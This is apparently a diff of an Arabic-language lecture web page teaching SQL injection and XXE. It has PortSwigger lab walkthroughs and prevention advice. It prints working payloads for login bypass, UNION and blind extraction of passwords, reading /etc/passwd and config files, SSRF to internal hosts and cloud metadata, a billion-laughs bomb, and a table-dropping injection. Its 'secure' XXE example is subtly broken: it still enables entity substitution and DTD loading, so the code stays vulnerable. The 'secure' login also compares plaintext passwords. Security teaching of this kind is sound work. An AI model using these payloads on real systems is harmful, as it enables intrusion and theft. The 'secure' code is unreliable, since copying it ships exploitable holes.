@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>محاضرة SQL Injection + XXE Injection - ساعتان</title>
-    <link href="https://cdnjs.cloudflaire.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -18,27 +19,27 @@
             color: #e0e0e0;
             line-height: 1.6;
             min-height: 100vh;
-            padding: 20px;
         }
 
         .container {
             max-width: 1200px;
             margin: 0 auto;
+            padding: 20px;
         }
 
         .header {
             background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            padding: 40px;
+            padding: 30px 0;
             text-align: center;
-            border-radius: 20px;
             margin-bottom: 30px;
+            border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
         .header h1 {
             color: #ffffff;
             font-size: 2.5em;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
         }
 
@@ -47,13 +48,63 @@
             font-size: 1.2em;
         }
 
+        .nav-menu {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            position: sticky;
+            top: 10px;
+            z-index: 100;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        .nav-menu ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .nav-menu a {
+            color: #64b5f6;
+            text-decoration: none;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            font-weight: 400;
+            font-size: 0.75em;
+            white-space: nowrap;
+        }
+
+        .nav-menu a:hover {
+            background: #64b5f6;
+            color: #1a1a1a;
+            transform: translateY(-1px);
+        }
+
         .content-section {
-            background: rgba(30, 30, 30, 0.9);
+            background: rgba(30, 30, 30, 0.8);
+            backdrop-filter: blur(10px);
+            margin-bottom: 30px;
             padding: 30px;
             border-radius: 15px;
-            margin-bottom: 30px;
             border: 1px solid rgba(255, 255, 255, 0.1);
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 4px;
+            background: linear-gradient(90deg, #64b5f6, #81c784);
+            z-index: 1000;
+            transition: width 0.3s ease;
         }
 
         .section-title {
@@ -67,17 +118,41 @@
             padding-bottom: 10px;
         }
 
+        .section-title i {
+            color: #81c784;
+        }
+
+        .subsection-title {
+            color: #81c784;
+            font-size: 1.5em;
+            margin: 25px 0 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
         .highlight-box {
             background: rgba(100, 181, 246, 0.1);
             border: 1px solid rgba(100, 181, 246, 0.3);
             border-radius: 10px;
             padding: 20px;
             margin: 20px 0;
+            position: relative;
         }
 
         .highlight-box.danger {
             background: rgba(244, 67, 54, 0.1);
             border-color: rgba(244, 67, 54, 0.3);
+        }
+
+        .highlight-box.success {
+            background: rgba(76, 175, 80, 0.1);
+            border-color: rgba(76, 175, 80, 0.3);
+        }
+
+        .highlight-box.warning {
+            background: rgba(255, 152, 0, 0.1);
+            border-color: rgba(255, 152, 0, 0.3);
         }
 
         .code-block {
@@ -86,118 +161,882 @@
             border-radius: 8px;
             padding: 20px;
             margin: 15px 0;
+            position: relative;
             overflow-x: auto;
         }
 
         .code-block pre {
             margin: 0;
-            color: #e0e0e0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
 
-        .back-link {
-            display: inline-flex;
+        .code-header {
+            background: #2d2d2d;
+            padding: 8px 15px;
+            margin: -20px -20px 15px -20px;
+            border-radius: 8px 8px 0 0;
+            font-size: 0.9em;
+            color: #81c784;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .lab-card {
+            background: linear-gradient(135deg, rgba(129, 199, 132, 0.1) 0%, rgba(100, 181, 246, 0.1) 100%);
+            border: 1px solid rgba(129, 199, 132, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+
+        .lab-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(129, 199, 132, 0.2);
+        }
+
+        .lab-title {
+            color: #81c784;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
             align-items: center;
             gap: 10px;
-            color: #64b5f6;
-            text-decoration: none;
-            padding: 10px 20px;
-            border: 1px solid #64b5f6;
-            border-radius: 25px;
-            transition: all 0.3s ease;
-            margin-top: 30px;
         }
 
-        .back-link:hover {
+        .lab-url {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #64b5f6;
+            margin-bottom: 15px;
+            word-break: break-all;
+        }
+
+        .step-list {
+            counter-reset: step-counter;
+            list-style: none;
+            padding: 0;
+        }
+
+        .step-list li {
+            counter-increment: step-counter;
+            background: rgba(0, 0, 0, 0.2);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #64b5f6;
+            position: relative;
+        }
+
+        .step-list li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: -15px;
+            top: 50%;
+            transform: translateY(-50%);
             background: #64b5f6;
-            color: #1a1a1a;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .tip-box {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .tip-box::before {
+            content: '\f0eb';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: #ffc107;
+            font-size: 1.2em;
+        }
+
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .flow-step {
+            background: rgba(100, 181, 246, 0.2);
+            padding: 10px 15px;
+            border-radius: 20px;
+            border: 1px solid rgba(100, 181, 246, 0.3);
+            font-size: 0.9em;
+            text-align: center;
+            min-width: 120px;
+        }
+
+        .flow-arrow {
+            color: #81c784;
+            font-size: 1.5em;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .section-title {
+                font-size: 1.5em;
+            }
+            
+            .attack-flow {
+                flex-direction: column;
+            }
+            
+            .flow-arrow {
+                transform: rotate(90deg);
+            }
         }
     </style>
 </head>
 <body>
+    <div class="progress-bar" id="progressBar"></div>
     <div class="container">
+        <!-- Header -->
         <div class="header">
             <h1><i class="fas fa-database"></i> SQL Injection + XXE Injection</h1>
             <p>محاضرة شاملة عن حقن SQL وثغرات XXE - ساعتان</p>
         </div>
 
-        <div class="content-section">
+        <!-- Navigation Menu -->
+        <div class="nav-menu">
+            <ul>
+                <li><a href="#introduction">مقدمة</a></li>
+                <li><a href="#sql-basics">أساسيات SQL Injection</a></li>
+                <li><a href="#sql-types">أنواع SQL Injection</a></li>
+                <li><a href="#sql-labs">مختبرات SQL Injection</a></li>
+                <li><a href="#xxe-basics">أساسيات XXE</a></li>
+                <li><a href="#xxe-types">أنواع XXE</a></li>
+                <li><a href="#xxe-labs">مختبرات XXE</a></li>
+                <li><a href="#prevention">طرق الحماية</a></li>
+                <li><a href="#conclusion">خاتمة</a></li>
+            </ul>
+        </div>
+
+        <!-- Introduction Section -->
+        <div class="content-section" id="introduction">
             <h2 class="section-title">
                 <i class="fas fa-info-circle"></i>
                 مقدمة عن الثغرات الأساسية
             </h2>
             
-            <p>مرحباً بكم في المحاضرة الأولى من سلسلة أمان تطبيقات الويب. في هذه المحاضرة، سنتعلم عن نوعين من أخطر الثغرات:</p>
+            <p>مرحباً بكم في المحاضرة الأولى من سلسلة أمان تطبيقات الويب. في هذه المحاضرة، سنتعلم عن نوعين من أخطر الثغرات في تطبيقات الويب:</p>
             
             <div class="highlight-box">
                 <h3><i class="fas fa-database"></i> SQL Injection</h3>
-                <p>ثغرة تسمح للمهاجم بحقن أوامر SQL خبيثة في استعلامات قاعدة البيانات.</p>
+                <p>ثغرة تسمح للمهاجم بحقن أوامر SQL خبيثة في استعلامات قاعدة البيانات، مما يمكنه من الوصول لبيانات حساسة أو التلاعب بها.</p>
             </div>
 
             <div class="highlight-box">
                 <h3><i class="fas fa-code"></i> XXE Injection</h3>
-                <p>ثغرة في معالجة XML تسمح بالوصول لملفات النظام وتنفيذ هجمات SSRF.</p>
+                <p>ثغرة في معالجة XML تسمح بالوصول لملفات النظام المحلية وتنفيذ هجمات SSRF ضد خوادم داخلية.</p>
+            </div>
+
+            <div class="attack-flow">
+                <div class="flow-step">اكتشاف نقطة الحقن</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">اختبار الPayloads</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">استخراج البيانات</div>
+                <div class="flow-arrow"><i class="fas fa-arrow-left"></i></div>
+                <div class="flow-step">استغلال متقدم</div>
             </div>
         </div>
 
-        <div class="content-section">
+        <!-- SQL Injection Basics Section -->
+        <div class="content-section" id="sql-basics">
             <h2 class="section-title">
-                <i class="fas fa-syringe"></i>
+                <i class="fas fa-database"></i>
                 أساسيات SQL Injection
             </h2>
 
+            <h3 class="subsection-title">
+                <i class="fas fa-question-circle"></i>
+                ما هو SQL Injection؟
+            </h3>
+            
+            <p>SQL Injection هو نوع من الهجمات حيث يستطيع المهاجم حقن كود SQL خبيث في استعلامات قاعدة البيانات. يحدث هذا عندما لا يتم تنظيف المدخلات بشكل صحيح قبل استخدامها في استعلامات SQL.</p>
+
             <div class="highlight-box danger">
-                <h4><i class="fas fa-exclamation-triangle"></i> خطورة SQL Injection</h4>
-                <p>SQL Injection يمكن أن يؤدي إلى تسريب بيانات كاملة، تدمير قواعد البيانات، أو السيطرة على الخادم.</p>
+                <h4><i class="fas fa-skull-crossbones"></i> خطورة SQL Injection</h4>
+                <p>SQL Injection يمكن أن يؤدي إلى:</p>
+                <ul style="margin-top: 10px;">
+                    <li>تسريب بيانات كاملة من قاعدة البيانات</li>
+                    <li>تعديل أو حذف البيانات</li>
+                    <li>تجاوز آليات المصادقة</li>
+                    <li>تنفيذ أوامر على مستوى نظام التشغيل</li>
+                </ul>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-cogs"></i>
+                كيف يعمل SQL Injection؟
+            </h3>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-code"></i>
+                    مثال على كود معرض لـ SQL Injection (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($connection, $query);
+
+if (mysqli_num_rows($result) > 0) {
+    echo "تم تسجيل الدخول بنجاح";
+} else {
+    echo "بيانات خاطئة";
+}
+?&gt;</code></pre>
+            </div>
+
+            <div class="tip-box">
+                <strong>نصيحة:</strong> ابحث دائماً عن نماذج تسجيل الدخول، البحث، وعرض المنتجات - هذه أكثر الأماكن عرضة لـ SQL Injection
             </div>
 
             <div class="code-block">
-                <pre><code># مثال على SQL Injection أساسي
-' OR '1'='1' --
-' UNION SELECT username, password FROM users --
-'; DROP TABLE users; --</code></pre>
+                <div class="code-header">
+                    <i class="fas fa-terminal"></i>
+                    استغلال الكود السابق
+                </div>
+                <pre><code># تجاوز تسجيل الدخول
+Username: admin' --
+Password: anything
+
+# النتيجة المنفذة
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
+
+# استخراج البيانات
+Username: ' UNION SELECT username, password FROM users --
+Password: anything</code></pre>
             </div>
         </div>
 
-        <div class="content-section">
+        <!-- SQL Types Section -->
+        <div class="content-section" id="sql-types">
             <h2 class="section-title">
-                <i class="fas fa-file-code"></i>
+                <i class="fas fa-list"></i>
+                أنواع SQL Injection
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-exclamation-triangle"></i>
+                Error-Based SQL Injection
+            </h3>
+            
+            <p>النوع الأسهل حيث تظهر رسائل الخطأ معلومات عن قاعدة البيانات:</p>
+            
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-bug"></i>
+                    مثال على Error-Based
+                </div>
+                <pre><code># إحداث خطأ لاستخراج معلومات
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --
+
+# استخراج أسماء الجداول
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --
+
+# استخراج أسماء الأعمدة
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0 --</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-link"></i>
+                Union-Based SQL Injection
+            </h3>
+            
+            <p>استخدام UNION لدمج نتائج استعلامات متعددة:</p>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-link"></i>
+                    خطوات Union-Based Attack
+                </div>
+                <pre><code># 1. تحديد عدد الأعمدة
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --  (حتى حدوث خطأ)
+
+# 2. تحديد الأعمدة المعروضة
+' UNION SELECT 1,2,3 --
+
+# 3. استخراج البيانات
+' UNION SELECT username, password, email FROM users --
+
+# 4. استخراج معلومات قاعدة البيانات
+' UNION SELECT database(), user(), version() --</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-eye-slash"></i>
+                Blind SQL Injection
+            </h3>
+            
+            <p>عندما لا تظهر أخطاء أو بيانات مباشرة، نعتمد على الاستجابات المختلفة:</p>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-question"></i>
+                    Boolean-based Blind
+                </div>
+                <pre><code># اختبار وجود جدول users
+' AND (SELECT COUNT(*) FROM users)>0 --
+
+# استخراج طول كلمة المرور للمستخدم الأول
+' AND (SELECT LENGTH(password) FROM users LIMIT 1)=8 --
+
+# استخراج حرف واحد في كل مرة
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' --</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-clock"></i>
+                    Time-based Blind
+                </div>
+                <pre><code># MySQL
+' AND IF(1=1, SLEEP(5), 0) --
+
+# PostgreSQL
+' AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END --
+
+# SQL Server
+' AND IF(1=1) WAITFOR DELAY '00:00:05' --</code></pre>
+            </div>
+        </div>
+
+        <!-- SQL Labs Section -->
+        <div class="content-section" id="sql-labs">
+            <h2 class="section-title">
+                <i class="fas fa-flask"></i>
+                مختبرات SQL Injection العملية
+            </h2>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الأول: SQL injection vulnerability in WHERE clause
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+                </div>
+                <p><strong>الهدف:</strong> استخدام SQL injection لعرض منتجات مخفية.</p>
+                
+                <ol class="step-list">
+                    <li>افتح المختبر وانتقل لقسم "Gifts"</li>
+                    <li>لاحظ URL: <code>/filter?category=Gifts</code></li>
+                    <li>جرب payload: <code>Gifts'--</code></li>
+                    <li>لعرض جميع المنتجات: <code>Gifts' OR 1=1--</code></li>
+                    <li>ستظهر منتجات مخفية لم تكن تظهر من قبل</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثاني: SQL injection UNION attack
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+                </div>
+                <p><strong>الهدف:</strong> استخدام UNION لتحديد عدد الأعمدة في الاستعلام.</p>
+                
+                <ol class="step-list">
+                    <li>افتح المختبر وانتقل لأي فئة</li>
+                    <li>جرب <code>' ORDER BY 1--</code> ثم زد الرقم تدريجياً</li>
+                    <li>عندما يحدث خطأ، فالعدد السابق هو عدد الأعمدة</li>
+                    <li>تأكد باستخدام: <code>' UNION SELECT NULL,NULL,NULL--</code></li>
+                    <li>يجب أن يعمل دون خطأ إذا كان العدد صحيح</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثالث: Blind SQL injection with conditional responses
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+                </div>
+                <p><strong>الهدف:</strong> استخدام Blind SQL injection لاستخراج كلمة مرور.</p>
+                
+                <div class="tip-box">
+                    <strong>ملاحظة:</strong> هذا المختبر يستخدم tracking cookies. راقب رسالة "Welcome back!" كمؤشر على نجاح الشرط.
+                </div>
+
+                <ol class="step-list">
+                    <li>اعترض الطلب واعثر على tracking cookie</li>
+                    <li>اختبر: <code>TrackingId=xyz' AND '1'='1</code></li>
+                    <li>تأكد من وجود جدول users: <code>xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code></li>
+                    <li>اختبر وجود administrator: <code>xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></li>
+                    <li>استخرج طول كلمة المرور واستخدم Burp Intruder لاستخراجها حرف بحرف</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- XXE Basics Section -->
+        <div class="content-section" id="xxe-basics">
+            <h2 class="section-title">
+                <i class="fas fa-code"></i>
                 أساسيات XXE Injection
             </h2>
 
+            <h3 class="subsection-title">
+                <i class="fas fa-question-circle"></i>
+                ما هو XXE؟
+            </h3>
+            
+            <p>XXE (XML External Entity) هو ثغرة أمنية تحدث عندما يقوم تطبيق ويب بمعالجة مدخلات XML تحتوي على مراجع لentities خارجية. يمكن للمهاجم استغلال هذا للوصول لملفات النظام أو تنفيذ هجمات SSRF.</p>
+
             <div class="highlight-box danger">
                 <h4><i class="fas fa-exclamation-triangle"></i> خطورة XXE</h4>
-                <p>XXE يمكن أن يؤدي إلى قراءة ملفات النظام، SSRF attacks، أو DoS attacks.</p>
+                <p>XXE يمكن أن يؤدي إلى:</p>
+                <ul style="margin-top: 10px;">
+                    <li>قراءة ملفات النظام الحساسة</li>
+                    <li>تنفيذ هجمات SSRF ضد خوادم داخلية</li>
+                    <li>تنفيذ هجمات DoS (XML Bomb)</li>
+                    <li>Remote Code Execution في بعض الحالات</li>
+                </ul>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-cogs"></i>
+                كيف يعمل XXE؟
+            </h3>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-code"></i>
+                    مثال على كود معرض لـ XXE (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+// كود معرض لـ XXE
+$xml = $_POST['xml'];
+$dom = new DOMDocument();
+$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
+echo $dom->saveXML();
+?&gt;</code></pre>
+            </div>
+
+            <div class="tip-box">
+                <strong>نصيحة:</strong> ابحث عن التطبيقات التي تقبل XML input مثل APIs، تحميل الملفات، أو RSS feeds
             </div>
 
             <div class="code-block">
-                <pre><code>&lt;!-- مثال على XXE payload --&gt;
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+                <div class="code-header">
+                    <i class="fas fa-terminal"></i>
+                    مثال على XXE Payload
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
-&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</code></pre>
+&lt;stockCheck&gt;
+    &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
             </div>
         </div>
 
-        <div class="content-section">
+        <!-- XXE Types Section -->
+        <div class="content-section" id="xxe-types">
+            <h2 class="section-title">
+                <i class="fas fa-list"></i>
+                أنواع XXE Attacks
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-file-alt"></i>
+                File Disclosure XXE
+            </h3>
+            
+            <p>النوع الأساسي حيث نستخدم XXE لقراءة ملفات النظام:</p>
+            
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-file-alt"></i>
+                    قراءة ملفات النظام
+                </div>
+                <pre><code># قراءة /etc/passwd في Linux
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+
+# قراءة ملفات Windows
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"&gt; ]&gt;
+
+# قراءة ملفات التطبيق
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///var/www/html/config.php"&gt; ]&gt;</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-globe"></i>
+                SSRF via XXE
+            </h3>
+            
+            <p>استخدام XXE لتنفيذ طلبات HTTP إلى خوادم داخلية:</p>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-globe"></i>
+                    SSRF عبر XXE
+                </div>
+                <pre><code># الوصول لخوادم داخلية
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://192.168.1.1/"&gt; ]&gt;
+
+# الوصول لـ AWS metadata
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt; ]&gt;
+
+# فحص منافذ داخلية
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://localhost:8080/"&gt; ]&gt;</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-bomb"></i>
+                XML Bomb (Billion Laughs Attack)
+            </h3>
+            
+            <p>هجوم DoS يهدف لاستنزاف ذاكرة الخادم:</p>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-bomb"></i>
+                    XML Bomb
+                </div>
+                <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
+  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol5;&lt;/lolz&gt;</code></pre>
+            </div>
+
+            <div class="highlight-box warning">
+                <h4><i class="fas fa-shield-alt"></i> تحذير مهم</h4>
+                <p>لا تستخدم XML Bomb إلا في بيئات الاختبار المسموحة. هذا الهجوم يمكن أن يعطل الخوادم فعلياً.</p>
+            </div>
+        </div>
+
+        <!-- XXE Labs Section -->
+        <div class="content-section" id="xxe-labs">
             <h2 class="section-title">
                 <i class="fas fa-flask"></i>
-                المختبرات العملية
+                مختبرات XXE العملية
+            </h2>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الأول: Exploiting XXE using external entities to retrieve files
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+                </div>
+                <p><strong>الهدف:</strong> استخدام XXE لقراءة محتوى ملف /etc/passwd.</p>
+                
+                <ol class="step-list">
+                    <li>افتح المختبر وانتقل لصفحة أي منتج</li>
+                    <li>اضغط على "Check stock" واعترض الطلب</li>
+                    <li>استبدل XML body بـ:</li>
+                    <li><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></li>
+                    <li>أرسل الطلب وستحصل على محتوى /etc/passwd</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثاني: Exploiting XXE to perform SSRF attacks
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+                </div>
+                <p><strong>الهدف:</strong> استخدام XXE لتنفيذ SSRF والوصول لخدمة داخلية.</p>
+                
+                <ol class="step-list">
+                    <li>اعترض طلب "Check stock" مرة أخرى</li>
+                    <li>استخدم payload لفحص الخوادم الداخلية:</li>
+                    <li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://192.168.0.1:8080/"&gt; ]&gt;</code></li>
+                    <li>جرب عناوين IP مختلفة في نطاق 192.168.0.x</li>
+                    <li>ابحث عن استجابة مختلفة تدل على وجود خدمة</li>
+                    <li>استخدم العنوان الصحيح للوصول للخدمة المطلوبة</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    المختبر الثالث: Blind XXE with out-of-band interaction
+                </div>
+                <div class="lab-url">
+                    https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
+                </div>
+                <p><strong>الهدف:</strong> استخدام Blind XXE مع out-of-band techniques.</p>
+                
+                <div class="tip-box">
+                    <strong>ملاحظة:</strong> ستحتاج لاستخدام Burp Collaborator أو خادم خارجي لتلقي الطلبات.
+                </div>
+
+                <ol class="step-list">
+                    <li>احصل على Burp Collaborator URL</li>
+                    <li>استخدم payload مع external DTD:</li>
+                    <li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-URL"&gt; ]&gt;</code></li>
+                    <li>أرسل الطلب وراقب Collaborator للطلبات الواردة</li>
+                    <li>إذا وصل طلب، فهناك XXE vulnerability</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Prevention Section -->
+        <div class="content-section" id="prevention">
+            <h2 class="section-title">
+                <i class="fas fa-shield-alt"></i>
+                طرق الحماية والدفاع
+            </h2>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-database"></i>
+                الحماية من SQL Injection
+            </h3>
+
+            <div class="highlight-box success">
+                <h4><i class="fas fa-check-circle"></i> أفضل الممارسات للحماية من SQL Injection</h4>
+                <ul style="margin-top: 15px;">
+                    <li><strong>Prepared Statements:</strong> استخدم parameterized queries دائماً</li>
+                    <li><strong>Input Validation:</strong> تحقق من جميع المدخلات وطبق whitelist filtering</li>
+                    <li><strong>Least Privilege:</strong> قلل صلاحيات قاعدة البيانات للحد الأدنى</li>
+                    <li><strong>WAF:</strong> استخدم Web Application Firewall كطبقة حماية إضافية</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-shield-alt"></i>
+                    مثال على كود آمن (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+// الطريقة الآمنة باستخدام Prepared Statements
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
+$user = $stmt->fetch();
+
+if ($user) {
+    echo "تم تسجيل الدخول بنجاح";
+} else {
+    echo "بيانات خاطئة";
+}
+?&gt;</code></pre>
+            </div>
+
+            <h3 class="subsection-title">
+                <i class="fas fa-code"></i>
+                الحماية من XXE
+            </h3>
+
+            <div class="highlight-box success">
+                <h4><i class="fas fa-check-circle"></i> أفضل الممارسات للحماية من XXE</h4>
+                <ul style="margin-top: 15px;">
+                    <li><strong>تعطيل External Entities:</strong> اضبط XML parser لرفض external entities</li>
+                    <li><strong>Input Validation:</strong> تحقق من XML input وطبق filtering صارم</li>
+                    <li><strong>استخدام Safe Parsers:</strong> استخدم مكتبات XML آمنة</li>
+                    <li><strong>Network Segmentation:</strong> فصل الخوادم الحساسة عن شبكة التطبيق</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">
+                    <i class="fas fa-shield-alt"></i>
+                    مثال على كود آمن (PHP)
+                </div>
+                <pre><code class="language-php">&lt;?php
+// الطريقة الآمنة لمعالجة XML
+$xml = $_POST['xml'];
+
+// تعطيل external entities
+libxml_disable_entity_loader(true);
+
+$dom = new DOMDocument();
+$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
+
+// التحقق من المحتوى قبل المعالجة
+if (strpos($xml, '&lt;!ENTITY') !== false) {
+    die('محتوى XML غير مسموح');
+}
+
+echo $dom->saveXML();
+?&gt;</code></pre>
